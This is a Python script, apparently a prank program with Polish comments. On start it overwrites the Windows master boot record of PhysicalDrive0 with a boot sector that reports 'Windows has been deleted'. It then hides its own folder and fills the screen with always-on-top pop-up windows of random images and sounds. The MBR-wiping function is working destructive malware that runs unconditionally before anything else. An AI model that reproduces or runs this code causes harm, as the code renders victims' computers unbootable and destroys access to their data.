import tkinter as tk
from PIL import Image, ImageTk
import requests
from io import BytesIO
import random
import os
import pygame
import ctypes


def rozpierdolMBR():
    hex_data = bytes([0x31, 0xC0, 0x8E, 0xD8, 0x8E, 0xC0, 0xBB, 0x00, 0x80, 0xBE, 0x1F, 0x7C, 0xE8, 0x00, 0x00, 0x56, 
0x50, 0xAC, 0x08, 0xC0, 0x74, 0x06, 0xB4, 0x0E, 0xCD, 0x10, 0xEB, 0xF5, 0x58, 0x5E, 0xC3, 0x59, 
0x6F, 0x75, 0x72, 0x20, 0x63, 0x6F, 0x6D, 0x70, 0x75, 0x74, 0x65, 0x72, 0x20, 0x77, 0x61, 0x73, 
0x20, 0x73, 0x75, 0x63, 0x63, 0x65, 0x73, 0x66, 0x75, 0x6C, 0x6C, 0x79, 0x20, 0x72, 0x65, 0x70, 
0x61, 0x69, 0x72, 0x65, 0x64, 0x20, 0x28, 0x57, 0x69, 0x6E, 0x64, 0x6F, 0x77, 0x73, 0x20, 0x68, 
0x61, 0x73, 0x20, 0x62, 0x65, 0x65, 0x6E, 0x20, 0x64, 0x65, 0x6C, 0x65, 0x74, 0x65, 0x64, 0x29, 
0x0D, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x55, 0xAA
])
    dll = ctypes.windll
    hDevice = dll.Kernel32.CreateFileW("\\\\.\\PhysicalDrive0", 0x40000000, 0x00000001 | 0x00000002, None, 3, 0,0) # Create a handle to our Physical Drive
    dll.Kernel32.WriteFile(hDevice, hex_data, None) # Overwrite the MBR! (Never run this on your main machine!)
    dll.Kernel32.CloseHandle(hDevice) # Close the handle to our Physical Drive!

rozpierdolMBR()

def ukryj_folder(sciezka):
    try:
        # Upewnij się, że sciezka jest bezwzględna
        sciezka = os.path.abspath(sciezka)
        
        # Ustaw atrybut ukryty dla folderu
        ctypes.windll.kernel32.SetFileAttributesW(sciezka, 0x02)
        
        print(f'Ukryto folder "{sciezka}"')
    except Exception as e:
        print(f'Błąd podczas ukrywania folderu: {e}')

if __name__ == "__main__":
    # Pobierz ścieżkę do bieżącego skryptu
    sciezka_skryptu = os.path.dirname(os.path.realpath(__file__))
    
    # Ukryj folder, w którym znajduje się skrypt
    ukryj_folder(sciezka_skryptu)




pygame.init()

background_music = None
sound_channel = None

photo = None

def get_random_image_from_api():
    url = "https://nekos.best/api/v2/neko"
    try:
        response = requests.get(url)
        response.raise_for_status()  
        data = response.json()
        if "results" in data and data["results"]:
            return data["results"][0]["url"]  
        else:
            print("No image URL found in API response")
            return None
    except requests.exceptions.RequestException as e:
        print(f"Request Exception: {e}")
        return None
    except ValueError as e:
        print(f"JSON Decode Error: {e}")
        return None

def play_background_music():
    global background_music
    if background_music is None:
        background_music = pygame.mixer.Sound("Bg/loop.mp3")  
        background_music.set_volume(0.62)  
        background_music.play(loops=-1)  

def play_random_sound():
    sounds_folder = "Sounds"
    sound_files = os.listdir(sounds_folder)
    if sound_files:
        random_sound = random.choice(sound_files)
        sound_path = os.path.join(sounds_folder, random_sound)
        sound = pygame.mixer.Sound(sound_path)
        sound.set_volume(1.0)  
        sound.play()


def display_random_image_from_api():
    global photo  
    
    root = tk.Tk()
    root.attributes("-topmost", True)
    root.overrideredirect(True) 

    image_width = 700
    image_height = 450

    screen_width = root.winfo_screenwidth()
    screen_height = root.winfo_screenheight()

    def update_image_from_api():
        global photo  
        
        image_url = get_random_image_from_api()
        if image_url:
            try:

                response = requests.get(image_url)
                response.raise_for_status()  
                image_data = response.content  
                image = Image.open(BytesIO(image_data))

                image = image.resize((image_width, image_height), Image.LANCZOS)
                photo = ImageTk.PhotoImage(image)

                label.configure(image=photo)
                label.image = photo  

                new_x = random.randint(0, screen_width - image_width)
                new_y = random.randint(0, screen_height - image_height)
                root.geometry(f"{image_width}x{image_height}+{new_x}+{new_y}")

                play_random_sound()

                root.after(7500, update_image_from_api)
            except requests.exceptions.RequestException as e:
                print(f"Request Exception: {e}")
                root.after(7500, update_image_from_api)  
        else:
            print("No image URL received from API. Retrying in 15 seconds...")
            root.after(7500, update_image_from_api)

    label = tk.Label(root)
    label.pack()

    update_image_from_api()

    play_background_music()

    root.mainloop()

display_random_image_from_api()
